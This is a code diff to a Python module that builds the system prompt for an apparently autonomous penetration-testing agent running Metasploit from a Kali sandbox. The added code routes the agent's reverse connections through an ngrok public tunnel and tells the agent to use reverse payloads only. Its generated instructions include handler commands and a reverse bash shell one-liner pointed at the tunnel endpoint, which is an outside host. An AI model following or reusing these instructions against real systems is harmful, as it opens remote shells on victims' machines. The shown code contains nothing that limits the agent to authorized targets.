@@ -5,8 +5,12 @@ Utility functions for API and prompts that are not orchestrator-specific.
 Orchestrator-specific helpers are in orchestrator_helpers/.
 """
 
+import logging
+
 from project_settings import get_setting
 from orchestrator_helpers import get_checkpointer
+
+logger = logging.getLogger(__name__)
 
 
 def get_session_count() -> int:
@@ -26,6 +30,9 @@ def get_session_config_prompt() -> str:
         BIND:    LHOST empty AND LPORT empty AND BIND_PORT set → clear bind intent
         ASK:     anything else (discordant or all empty) → agent must ask user
 
+    When NGROK_TUNNEL_ENABLED is True, the agent queries the ngrok API to
+    auto-discover the public tunnel URL, overriding LHOST and LPORT.
+
     Returns:
         Formatted string with Metasploit commands for the agent.
     """
@@ -34,6 +41,24 @@ def get_session_config_prompt() -> str:
     LPORT = get_setting('LPORT')
     BIND_PORT_ON_TARGET = get_setting('BIND_PORT_ON_TARGET')
     PAYLOAD_USE_HTTPS = get_setting('PAYLOAD_USE_HTTPS', False)
+    NGROK_TUNNEL_ENABLED = get_setting('NGROK_TUNNEL_ENABLED', False)
+
+    # -------------------------------------------------------------------------
+    # NGROK TUNNEL: auto-discover public URL if enabled
+    # -------------------------------------------------------------------------
+    ngrok_active = False
+    ngrok_error = None
+    ngrok_hostname = None
+    if NGROK_TUNNEL_ENABLED:
+        tunnel_info = _query_ngrok_tunnel()
+        if tunnel_info:
+            LHOST = tunnel_info['host']
+            LPORT = tunnel_info['port']
+            ngrok_hostname = tunnel_info.get('hostname')
+            ngrok_active = True
+        else:
+            ngrok_error = ("ngrok tunnel enabled but API unreachable "
+                           "— falling back to configured LHOST/LPORT")
 
     # -------------------------------------------------------------------------
     # 3-WAY DECISION: reverse / bind / ask user
@@ -52,6 +77,26 @@ def get_session_config_prompt() -> str:
     lines = []
     lines.append("### Pre-Configured Payload Settings")
     lines.append("")
+
+    # -------------------------------------------------------------------------
+    # NGROK STATUS BANNER (if enabled)
+    # -------------------------------------------------------------------------
+    if NGROK_TUNNEL_ENABLED:
+        if ngrok_active:
+            lines.append(f"**ngrok Tunnel: ACTIVE** — public endpoint `{LHOST}:{LPORT}`")
+            if ngrok_hostname and ngrok_hostname != LHOST:
+                lines.append(f"(hostname `{ngrok_hostname}` pre-resolved to IP `{LHOST}` — "
+                             "use the IP in all payloads so targets with limited DNS can connect back)")
+            lines.append("The Metasploit listener runs locally on kali-sandbox:4444.")
+            lines.append("The target connects to the ngrok public URL, which tunnels traffic to your listener.")
+            lines.append("")
+            lines.append("**CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https). "
+                         "NEVER use bind payloads — bind mode cannot work through an ngrok tunnel "
+                         "because ngrok only forwards inbound connections to the local listener.**")
+            lines.append("")
+        elif ngrok_error:
+            lines.append(f"**ngrok Tunnel: ERROR** — {ngrok_error}")
+            lines.append("")
 
     # -------------------------------------------------------------------------
     # SHOW CONFIGURED MODE
@@ -94,12 +139,35 @@ def get_session_config_prompt() -> str:
         lines.append(f"- `linux/*/meterpreter/{conn_type}` for Linux native binaries")
         lines.append(f"- `windows/*/meterpreter/{conn_type}` for Windows targets")
         lines.append("")
-        lines.append("**Metasploit commands:**")
-        lines.append("```")
-        lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
-        lines.append(f"set LHOST {LHOST}")
-        lines.append(f"set LPORT {LPORT}")
-        lines.append("```")
+        if ngrok_active:
+            lines.append("**IMPORTANT: ngrok tunnel is active — REVERSE payloads ONLY!**")
+            lines.append("")
+            lines.append("There are TWO different LHOST/LPORT values — do NOT confuse them:")
+            lines.append("")
+            lines.append(f"| Purpose | LHOST | LPORT |")
+            lines.append(f"|---------|-------|-------|")
+            lines.append(f"| **Metasploit handler** (`set` commands inside msfconsole) | `0.0.0.0` | `4444` |")
+            lines.append(f"| **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |")
+            lines.append("")
+            lines.append("The handler listens locally on port 4444. ngrok forwards traffic from the public URL to it.")
+            lines.append("")
+            lines.append("**Metasploit handler commands (inside msfconsole):**")
+            lines.append("```")
+            lines.append("set PAYLOAD <chosen_reverse_payload_from_show_payloads>")
+            lines.append("set LHOST 0.0.0.0")
+            lines.append("set LPORT 4444")
+            lines.append("```")
+            lines.append("")
+            lines.append("**For shell one-liners and standalone payloads (msfvenom, curl injection, execute_code):**")
+            lines.append(f"Use `LHOST={LHOST}` and `LPORT={LPORT}` (the ngrok public endpoint).")
+            lines.append(f"Example reverse bash: `bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`")
+        else:
+            lines.append("**Metasploit commands:**")
+            lines.append("```")
+            lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
+            lines.append(f"set LHOST {LHOST}")
+            lines.append(f"set LPORT {LPORT}")
+            lines.append("```")
         lines.append("")
         lines.append("After exploit succeeds, use `msf_wait_for_session()` to wait for session.")
 
@@ -145,7 +213,11 @@ def get_session_config_prompt() -> str:
         lines.append(f"- LPORT (Attacker Port): `{LPORT or 'empty'}`")
         lines.append(f"- Bind Port on Target: `{BIND_PORT_ON_TARGET or 'empty'}`")
         lines.append("")
-        if has_lhost and not has_lport:
+        if NGROK_TUNNEL_ENABLED and ngrok_error:
+            lines.append("**Problem:** ngrok tunnel is enabled but the tunnel API is unreachable.")
+            lines.append("The user intended to use a REVERSE payload through ngrok, but the tunnel is not running.")
+            lines.append("Ask the user to check that `NGROK_AUTHTOKEN` is set in `.env` and the kali-sandbox container was restarted.")
+        elif has_lhost and not has_lport:
             lines.append("**Problem:** LHOST is set but LPORT is missing. For reverse payloads, both are required.")
         elif has_lport and not has_lhost:
             lines.append("**Problem:** LPORT is set but LHOST is missing. For reverse payloads, both are required.")
@@ -164,3 +236,63 @@ def get_session_config_prompt() -> str:
     lines.append("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")
 
     return "\n".join(lines)
+
+
+def _query_ngrok_tunnel() -> dict | None:
+    """
+    Query the ngrok API to get the public TCP tunnel URL.
+
+    ngrok runs inside kali-sandbox and exposes its API at
+    http://kali-sandbox:4040/api/tunnels within the Docker network.
+
+    The hostname is resolved to an IP address so that targets with limited
+    or broken DNS can still connect back to the ngrok endpoint.
+
+    Returns:
+        Dict with 'host' (str — resolved IP), 'port' (int), and
+        'hostname' (str — original ngrok hostname) if a TCP tunnel is
+        found, or None if ngrok is unreachable or no tunnel exists.
+    """
+    import requests
+    import socket
+
+    try:
+        resp = requests.get("http://kali-sandbox:4040/api/tunnels", timeout=5)
+        resp.raise_for_status()
+        data = resp.json()
+
+        for tunnel in data.get("tunnels", []):
+            if tunnel.get("proto") == "tcp":
+                public_url = tunnel["public_url"]  # e.g. "tcp://0.tcp.ngrok.io:12345"
+                addr = public_url.replace("tcp://", "")
+                hostname, port_str = addr.rsplit(":", 1)
+                port = int(port_str)
+
+                # Resolve hostname to IP so the target doesn't need DNS
+                try:
+                    resolved_ip = socket.gethostbyname(hostname)
+                    logger.info(
+                        f"Resolved ngrok hostname {hostname} -> {resolved_ip}"
+                    )
+                    return {
+                        "host": resolved_ip,
+                        "port": port,
+                        "hostname": hostname,
+                    }
+                except socket.gaierror:
+                    logger.warning(
+                        f"Could not resolve ngrok hostname {hostname}, "
+                        "using hostname as-is"
+                    )
+                    return {
+                        "host": hostname,
+                        "port": port,
+                        "hostname": hostname,
+                    }
+
+        logger.warning("ngrok API returned no TCP tunnels")
+        return None
+
+    except Exception as e:
+        logger.warning(f"Failed to query ngrok tunnel API: {e}")
+        return None
